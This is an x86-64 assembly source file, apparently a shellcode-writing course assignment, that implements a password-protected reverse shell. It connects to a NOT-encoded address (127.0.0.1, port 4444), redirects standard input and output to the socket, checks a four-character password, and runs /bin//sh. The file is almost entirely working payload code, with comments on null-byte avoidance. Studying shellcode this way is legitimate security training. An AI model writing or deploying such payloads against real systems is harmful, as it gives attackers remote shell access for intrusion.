;The MIT License (MIT)

;Copyright (c) 2017 Robert L. Taylor

;Permission is hereby granted, free of charge, to any person obtaining a 
;copy of this software and associated documentation files (the “Software”), 
;to deal in the Software without restriction, including without limitation 
;the rights to use, copy, modify, merge, publish, distribute, sublicense, 
;and/or sell copies of the Software, and to permit persons to whom the 
;Software is furnished to do so, subject to the following conditions:

;The above copyright notice and this permission notice shall be included 
;in all copies or substantial portions of the Software.

;The Software is provided “as is”, without warranty of any kind, express or
;implied, including but not limited to the warranties of merchantability, 
;fitness for a particular purpose and noninfringement. In no event shall the
;authors or copyright holders be liable for any claim, damages or other 
;liability, whether in an action of contract, tort or otherwise, arising 
;from, out of or in connection with the software or the use or other 
;dealings in the Software.
;
; For a detailed explanation of this shellcode see my blog post: 
; http://a41l4.blogspot.ca/2017/02/assignment-2a.html

global _start
section .text
_start:
; Socket
	push 41
	pop rax
	push 2
	pop rdi
	push 1
	pop rsi
	cdq
	syscall
; Connect
	xchg edi, eax
	push rdx
	mov rbx, 0xfeffff80a3eefffd ; not encoded 0x0100007f5c110002
	not rbx
	push rbx
	mov al, 42
	push rsp
	pop rsi
	mov dl, 16
	syscall
; Dup 2
	push 3
	pop rsi
dup2loop:	
	mov al, 33
	dec esi
        syscall
	loopnz dup2loop
; Read
	; rax and rsi are zero from the result of the last dup2 syscall and loop
	; dl is still set to 16 from earlier
	push rsp
	pop rsi ; lets use the stack for our buffer.
		; RDI still has our sockfd socket descriptor
		; RAX is already set to 0 the syscall number for Read
	syscall
	pop rsi
	sub esi, '1434' ; compare with our 4 character password, simultaneously zero rsi
	jnz _start ; Jump back to the start so we know what causes the segfault
; Execve
	; There is an 8 byte chunck of zeros already on the stack
        mov rbx, '/bin//sh'
        push rbx

        ; store /bin//sh address in RDI
	push rsp
	pop rdi
	
	cdq ; zero rdx

	mov al, 59
        syscall